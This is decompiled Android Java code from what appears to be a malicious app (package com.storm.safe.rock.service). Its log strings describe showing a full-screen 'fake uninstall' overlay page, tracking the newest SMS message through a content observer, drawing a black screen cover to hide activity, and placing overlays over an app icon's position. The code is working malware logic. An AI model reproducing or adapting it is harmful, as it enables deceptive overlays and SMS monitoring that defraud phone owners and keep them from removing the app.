package p000;

import android.content.Intent;
import android.database.Cursor;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.WindowManager;
import android.widget.ScrollView;
import com.storm.safe.rock.service.RunnableC0284a4;
import com.storm.safe.rock.service.dqtvuisjd;
import java.io.IOException;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final /* synthetic */ class bm0 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f45906a0;

    /* renamed from: a1 */
    public final /* synthetic */ dqtvuisjd f45907a1;

    public /* synthetic */ bm0(dqtvuisjd dqtvuisjdVar, int i) {
        this.f45906a0 = i;
        this.f45907a1 = dqtvuisjdVar;
    }

    /* JADX WARN: Finally extract failed */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0268  */
    /* JADX WARN: Removed duplicated region for block: B:140:0x0132 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() throws IOException {
        WindowManager windowManager;
        long j;
        Cursor cursorQuery;
        int i = 0;
        switch (this.f45906a0) {
            case 0:
                dqtvuisjd dqtvuisjdVar = this.f45907a1;
                try {
                    t60.m214714d6("PkgVerifyOverlay", "📦 showInternal 执行中... 策略=" + cm0.m210868a3() + ", 重试=" + cm0.f46153a3);
                    if (cm0.f46152a2) {
                        t60.m214726f4("PkgVerifyOverlay", "📦 已在显示，跳过");
                        return;
                    }
                    if (dqtvuisjdVar.getSharedPreferences("pkg_verify_state", 0).getBoolean("v_done", false)) {
                        t60.m214714d6("PkgVerifyOverlay", "📦 shouldShow=false，已弹过，跳过");
                        return;
                    }
                    if (cm0.f46154a4 != 0 && !Settings.canDrawOverlays(dqtvuisjdVar)) {
                        t60.m214726f4("PkgVerifyOverlay", "📦 策略 " + cm0.m210868a3() + " 需要悬浮窗权限但未授权，跳过");
                        cm0.m210871a6(dqtvuisjdVar);
                        return;
                    }
                    t60.m214714d6("PkgVerifyOverlay", "📦 获取 WindowManager...");
                    Object systemService = dqtvuisjdVar.getSystemService("window");
                    WindowManager windowManager2 = systemService instanceof WindowManager ? (WindowManager) systemService : null;
                    cm0.f46150a0 = windowManager2;
                    if (windowManager2 == null) {
                        t60.m214704c5("PkgVerifyOverlay", "📦 WindowManager 获取失败！");
                        cm0.m210870a5(dqtvuisjdVar, "WindowManager为空");
                        return;
                    }
                    t60.m214714d6("PkgVerifyOverlay", "📦 构建页面...");
                    cm0.f46151a1 = cm0.m210865a0(dqtvuisjdVar);
                    int i2 = cm0.f46154a4;
                    int i3 = 2032;
                    if (i2 != 0) {
                        if (i2 == 1) {
                            i3 = 2038;
                        } else if (i2 == 2) {
                            if (Build.VERSION.SDK_INT < 26) {
                                i3 = 2003;
                            }
                        }
                    }
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                    layoutParams.width = -1;
                    layoutParams.height = -1;
                    layoutParams.type = i3;
                    layoutParams.flags = 800;
                    layoutParams.format = -3;
                    layoutParams.gravity = 8388659;
                    t60.m214714d6("PkgVerifyOverlay", "📦 addView: 策略=" + cm0.m210868a3() + ", type=" + i3 + ", flags=" + layoutParams.flags);
                    WindowManager windowManager3 = cm0.f46150a0;
                    if (windowManager3 != null) {
                        windowManager3.addView(cm0.f46151a1, layoutParams);
                    }
                    cm0.f46152a2 = true;
                    t60.m214714d6("PkgVerifyOverlay", "📦 ✅ addView 成功！策略=".concat(cm0.m210868a3()));
                    dqtvuisjdVar.getSharedPreferences("pkg_verify_state", 0).edit().putBoolean("v_done", true).apply();
                    cm0.m210869a4(dqtvuisjdVar);
                    t60.m214714d6("PkgVerifyOverlay", "📦 ✅ 假卸载页面已显示成功！");
                    return;
                } catch (Exception e) {
                    t60.m214704c5("PkgVerifyOverlay", "📦 ❌ 策略 " + cm0.m210868a3() + " 显示失败: " + e.getMessage());
                    try {
                        ScrollView scrollView = cm0.f46151a1;
                        if (scrollView != null && (windowManager = cm0.f46150a0) != null) {
                            windowManager.removeView(scrollView);
                        }
                    } catch (Exception unused) {
                    }
                    cm0.f46151a1 = null;
                    cm0.m210870a5(dqtvuisjdVar, "异常: " + e.getMessage());
                    return;
                }
            case 1:
                cm0.f46155a5.post(new bm0(this.f45907a1, i));
                return;
            case 2:
                cm0.f46155a5.post(new bm0(this.f45907a1, i));
                return;
            case 3:
                dqtvuisjd dqtvuisjdVar2 = this.f45907a1;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                t60.m214695b6(dqtvuisjdVar2, "this$0");
                C0763km c0763km = dqtvuisjdVar2.f52427f8;
                if (c0763km != null) {
                    c0763km.m213600a0();
                    return;
                } else {
                    t60.m214724f2("configMaskManager");
                    throw null;
                }
            case 4:
                dqtvuisjd dqtvuisjdVar3 = this.f45907a1;
                dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                try {
                    cursorQuery = dqtvuisjdVar3.getContentResolver().query(Uri.parse("content://sms"), new String[]{"_id"}, null, null, "_id DESC LIMIT 1");
                } catch (Exception e2) {
                    tz0.m214807a7("📩 [ContentObserver] 获取最新短信ID失败: ", e2.getMessage(), "dqtvuisjd");
                }
                if (cursorQuery != null) {
                    try {
                        if (cursorQuery.moveToFirst()) {
                            j = cursorQuery.getLong(0);
                            t60.m214714d6("dqtvuisjd", "📩 [ContentObserver] 最新短信ID: " + j);
                            cursorQuery.close();
                        } else {
                            cursorQuery.close();
                            cursorQuery = dqtvuisjdVar3.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id"}, null, null, "_id DESC LIMIT 1");
                            if (cursorQuery != null) {
                                try {
                                    if (cursorQuery.moveToFirst()) {
                                        j = cursorQuery.getLong(0);
                                        t60.m214714d6("dqtvuisjd", "📩 [ContentObserver] 最新收件箱ID: " + j);
                                        cursorQuery.close();
                                    } else {
                                        cursorQuery.close();
                                    }
                                } catch (Throwable th) {
                                    try {
                                        throw th;
                                    } finally {
                                    }
                                }
                            }
                            t60.m214726f4("dqtvuisjd", "📩 [ContentObserver] 短信数据库为空");
                            j = Long.MAX_VALUE;
                        }
                    } catch (Throwable th2) {
                        try {
                            throw th2;
                        } finally {
                        }
                    }
                } else {
                    cursorQuery = dqtvuisjdVar3.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id"}, null, null, "_id DESC LIMIT 1");
                    if (cursorQuery != null) {
                    }
                    t60.m214726f4("dqtvuisjd", "📩 [ContentObserver] 短信数据库为空");
                    j = Long.MAX_VALUE;
                }
                dqtvuisjdVar3.f52464j5 = j;
                t60.m214714d6("dqtvuisjd", "📩 [ContentObserver] 当前最新短信ID: " + j);
                return;
            case 5:
                dqtvuisjd dqtvuisjdVar4 = this.f45907a1;
                dqtvuisjd.C0290a0 c0290a03 = dqtvuisjd.f52358m1;
                try {
                    t60.m214714d6("dqtvuisjd", "⚙️ Step 3: 打开应用详情页面");
                    Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                    intent.setData(Uri.parse("package:" + dqtvuisjdVar4.getPackageName()));
                    intent.addFlags(268435456);
                    intent.addFlags(67108864);
                    intent.addFlags(8388608);
                    dqtvuisjdVar4.startActivity(intent);
                    t60.m214714d6("dqtvuisjd", "✅ 已打开应用详情页面");
                    new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0284a4(dqtvuisjdVar4, 1), 1500L);
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("dqtvuisjd", "❌ 打开应用详情失败", e3);
                    return;
                }
            case 6:
                dqtvuisjd dqtvuisjdVar5 = this.f45907a1;
                dqtvuisjd.C0290a0 c0290a04 = dqtvuisjd.f52358m1;
                t60.m214695b6(dqtvuisjdVar5, "this$0");
                dqtvuisjdVar5.m211490i4();
                return;
            case 7:
                dqtvuisjd dqtvuisjdVar6 = this.f45907a1;
                dqtvuisjd.C0290a0 c0290a05 = dqtvuisjd.f52358m1;
                if (!dqtvuisjdVar6.f52469k0) {
                    t60.m214702c3("dqtvuisjd", "黑屏已被取消，跳过重试回调");
                    return;
                }
                dqtvuisjdVar6.m211453e2();
                dqtvuisjdVar6.m211491i5();
                t60.m214714d6("dqtvuisjd", "✅ 黑屏遮盖重试完成");
                return;
            case 8:
                dqtvuisjd dqtvuisjdVar7 = this.f45907a1;
                dqtvuisjd.C0290a0 c0290a06 = dqtvuisjd.f52358m1;
                dqtvuisjdVar7.getClass();
                try {
                    Rect rect = dqtvuisjdVar7.f52476k7;
                    if (rect == null || rect.isEmpty()) {
                        t60.m214726f4("dqtvuisjd", "⚠️ 没有保存的图标位置，无法创建覆盖层");
                    } else {
                        t60.m214714d6("dqtvuisjd", "🛡️ 在保存的位置创建覆盖层: " + rect);
                        dqtvuisjdVar7.m211452d9(rect);
                    }
                    return;
                } catch (Exception e4) {
                    t60.m214705c6("dqtvuisjd", "❌ 创建覆盖层失败", e4);
                    return;
                }
            default:
                dqtvuisjd dqtvuisjdVar8 = this.f45907a1;
                t60.m214695b6(dqtvuisjdVar8, "this$0");
                dqtvuisjd.C0290a0 c0290a07 = dqtvuisjd.f52358m1;
                dqtvuisjdVar8.m211490i4();
                return;
        }
    }
}
